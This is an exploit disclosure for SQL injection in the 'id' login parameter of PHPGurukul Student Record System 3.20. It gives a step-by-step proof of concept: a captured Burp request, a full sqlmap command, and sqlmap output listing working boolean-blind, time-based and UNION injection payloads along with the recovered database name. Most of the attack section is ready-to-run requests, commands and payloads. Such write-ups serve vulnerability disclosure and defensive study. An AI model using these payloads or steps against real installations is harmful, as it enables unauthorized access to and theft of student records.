# Student Record System - SQL Injection - 1
+ **Exploit Title:** Student Record System - SQL Injection - 1
+ **Date:** 2024-01-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://phpgurukul.com/student-record-system-php/
+ **Software Link:** https://phpgurukul.com/?sdm_process_download=1&download_id=7216
+ **Version:** 3.20
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number

## Description:
Student Record Managment System 3.20 allows SQL Injection via the 'id' parameter in "http://localhost/studentrecordms/login.php". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/studentrecordms/login.php"
+ Try logging in with `test`:`test`
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
POST /studentrecordms/login.php HTTP/1.1
Host: localhost
Content-Length: 34
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/studentrecordms/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=5vLeVxlRzkNb47vKDPMo5Lq8wdzLtvf1Hem0jn6EZm2ygrX19BpaQWOJY3oM; welcomebanner_status=dismiss; cookieconsent_status=dismiss; PHPSESSID=16p8fmbt5nnt6j32qlumjroui0
Connection: close

id=test&password=test&submit=login
```

+ Use sqlmap to exploit. In sqlmap, use 'id' parameter to dump the database.
```
sqlmap -r r.txt -p id --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: id=test' OR NOT 2939=2939-- diuV&password=test&submit=login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=test' AND (SELECT 9361 FROM (SELECT(SLEEP(5)))XNFL)-- djJN&password=test&submit=login

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=test' UNION ALL SELECT 90,CONCAT(0x71707a7071,0x746578536c7064575a674d62536d4b426b737074524d5a64787a674b5359624e757a6457556f4d42,0x71766b7a71)-- -&password=test&submit=login
---
[01:18:24] [INFO] the back-end DBMS is MySQL
[01:18:24] [WARNING] results seems to be upper-cased by force. sqlmap will automatically lower-case them
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[01:18:24] [INFO] fetching current database
current database: 'studentrecorddb'
```
+ current database: `studentrecorddb`

![Ekran görüntüsü 2024-04-01 081908](https://github.com/BurakSevben/CVEs/assets/117217689/622ec511-c580-4312-ab4d-e15630ad85bd)
